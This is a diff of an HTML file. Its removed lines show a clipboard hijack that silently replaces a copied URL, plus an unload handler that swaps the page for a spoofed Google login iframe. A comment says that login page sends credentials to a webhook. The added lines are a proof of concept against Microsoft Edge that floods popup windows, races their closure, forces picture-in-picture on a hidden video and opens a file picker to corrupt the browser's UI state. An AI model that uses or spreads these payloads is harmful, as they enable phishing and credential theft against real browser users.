@@ -1,34 +1,118 @@
-<p>Click the button below and right click and 'paste' in the address bar to navigate press Enter </p>
-
-<input id="tst" value="https://www.google.com" disabled size="50"><br>
-	<button onclick="copyt()">Copy</button>
-<script>
-
-function copyt(){
-		tst.disabled = false;
-		tst.select();
-		document.execCommand('copy');
-		tst.disabled = true;
-	}
-
-	tst.oncopy=function(e){
-		e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
-		e.preventDefault();
-	} 
-	</script>
-
-
-<!DOCTYPE HTML>
-<html>
- <head>
-  <meta charset="utf-8">
- </head>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: Edge UI State Persistence (Advanced Multi-Window)</title>
+    <style>
+        :root { --edge-blue: #0078d4; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background: #f4f4f4; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 15px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            max-width: 500px; 
+            text-align: center; 
+        }
+        .target-area {
+            border: 3px dashed var(--edge-blue);
+            background: #f0f7ff;
+            padding: 50px 20px;
+            margin: 20px 0;
+            cursor: crosshair;
+            font-weight: bold;
+            color: var(--edge-blue);
+            transition: 0.2s;
+        }
+        .target-area:hover { background: #e1efff; }
+        .log-box {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: left;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            height: 120px;
+            overflow-y: auto;
+        }
+        .warning { color: #d83b01; font-size: 14px; margin-bottom: 10px; font-weight: bold; }
+    </style>
+</head>
 <body>
- <script>
-		window.onbeforeunload = function test() {
-document.body.innerHTML='<iframe src="https://cnfdnfial-ops.github.io/spoof/login" style="width:100%;height:100vh;border:none"></iframe>'; // ON FRAME LOGIN I ALSO USING WEBHOOK TO CAPTURE REQUEST
-	document.title="Google";
-};
+
+<div class="container">
+    <h2>Edge UI Exploit Researcher</h2>
+    <p class="warning">Requirement: Enable "Split Screen" (Ctrl+Shift+2)</p>
+    
+    <div class="target-area" id="exploitTrigger">
+        KLIK KANAN BERKALI-KALI DI SINI
+    </div>
+
+    <div class="log-box" id="statusLog">> Menunggu interaksi user...</div>
+</div>
+
+<!-- Hidden Video for PiP Hijacking -->
+<video id="v" style="display:none" loop muted playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
+
+<script>
+    const log = document.getElementById('statusLog');
+    const v = document.getElementById('v');
+    let windowStack = [];
+
+    function addLog(msg) {
+        const time = new Date().toLocaleTimeString().split(' ')[0];
+        log.innerHTML += `<div>[${time}] ${msg}</div>`;
+        log.scrollTop = log.scrollHeight;
+    }
+
+    document.getElementById('exploitTrigger').oncontextmenu = async (e) => {
+        addLog("Trigger detected. Launching flood...");
+
+        // 1. Multi-Window Flood dengan URL Eksternal (Google)
+        // Membuka 5 window kecil untuk membingungkan Window Manager
+        for (let i = 0; i < 5; i++) {
+            let w = window.open("https://www.google.com", `target_${i}`, `width=200,height=200,left=${i*50},top=${i*50}`);
+            if (w) windowStack.push(w);
+        }
+
+        addLog("Race condition in progress...");
+
+        // 2. Race Condition Timing
+        setTimeout(async () => {
+            try {
+                // Tutup semua window secara paksa untuk memicu perpindahan fokus mendadak
+                windowStack.forEach(win => { if(!win.closed) win.close(); });
+                windowStack = [];
+
+                addLog("Attempting PiP Hijack during focus shift...");
+                await v.play();
+                await v.requestPictureInPicture();
+
+                // 3. UI State Persistence Trigger
+                // Memanggil File Picker saat browser sedang sibuk merecovery UI
+                setTimeout(() => {
+                    window.showOpenFilePicker().catch(() => {});
+                    addLog("<span style='color:red; font-weight:bold;'>POC SUCCESS: UI STATE PERSISTENCE HIJACKED</span>");
+                }, 150);
+
+            } catch (err) {
+                addLog("Error: " + err.message);
+            }
+        }, 800); // Delay 800ms adalah sweet spot untuk render window eksternal
+    };
 </script>
- </body>
+
+</body>
 </html>
